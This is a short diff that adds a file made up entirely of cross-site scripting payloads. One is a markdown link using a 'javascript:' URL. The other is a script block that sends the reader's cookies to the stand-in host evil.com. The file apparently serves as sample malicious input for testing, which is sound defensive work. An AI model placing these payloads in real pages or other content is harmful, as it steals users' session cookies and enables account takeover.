@@ -1,0 +1,5 @@
+Check out this cool article: [Click here](javascript:alert('XSS')) for more info!
+
+<script>
+window.location = 'https://evil.com/steal?cookies=' + document.cookie;
+</script>
